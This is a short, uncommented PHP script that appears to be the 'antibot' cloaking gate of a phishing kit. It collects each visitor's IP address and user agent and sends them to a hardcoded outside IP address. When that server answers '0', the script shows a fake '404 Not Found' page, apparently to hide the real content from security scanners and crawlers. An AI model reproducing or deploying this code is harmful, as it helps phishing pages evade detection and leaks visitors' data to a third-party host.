<?php
header('Access-Control-Allow-Origin: *');
function url_get_contents($Url){$ch=curl_init();curl_setopt($ch,CURLOPT_URL,$Url);curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);$output=curl_exec($ch);curl_close($ch);return $output;}function getRealIpAddr(){if((!empty($_SERVER['GEOIP_ADDR']))&&(($_SERVER['GEOIP_ADDR'])<>'127.0.0.1')){$ip=$_SERVER['GEOIP_ADDR'];}elseif((!empty($_SERVER['HTTP_X_FORWARDED_FOR']))&&(($_SERVER['HTTP_X_FORWARDED_FOR'])<>'127.0.0.1')&&(($_SERVER['HTTP_X_FORWARDED_FOR'])<>($_SERVER['SERVER_ADDR']))){$ip=explode(',',$_SERVER['HTTP_X_FORWARDED_FOR'])[0];}elseif((!empty($_SERVER['HTTP_CLIENT_IP']))&&(($_SERVER['HTTP_CLIENT_IP'])<>'127.0.0.1')&&(($_SERVER['HTTP_CLIENT_IP'])<>($_SERVER['SERVER_ADDR']))){$ip=$_SERVER['HTTP_CLIENT_IP'];}elseif((!empty($_SERVER['HTTP_X_REAL_IP']))&&(($_SERVER['HTTP_X_REAL_IP'])<>'127.0.0.1')&&(($_SERVER['HTTP_X_REAL_IP'])<>($_SERVER['SERVER_ADDR']))){$ip=$_SERVER['HTTP_X_REAL_IP'];}else{$ip=$_SERVER['REMOTE_ADDR'];}return $ip;}function getRealua(){if(empty($_SERVER['HTTP_USER_AGENT'])){$_SERVER['HTTP_USER_AGENT']=getenv('HTTP_USER_AGENT');}return $_SERVER['HTTP_USER_AGENT'];}$ip=getRealIpAddr();$ua=getRealua();$url='http://18.191.45.54/antibot.php';$data=array('ip'=>$ip,'ua'=>$ua);$data=http_build_query($data,'','&');$response=url_get_contents($url."?".$data);if(trim($response)=="0"){die("<h1>404 Not Found</h1>The page that you have requested could not be found.");}
?>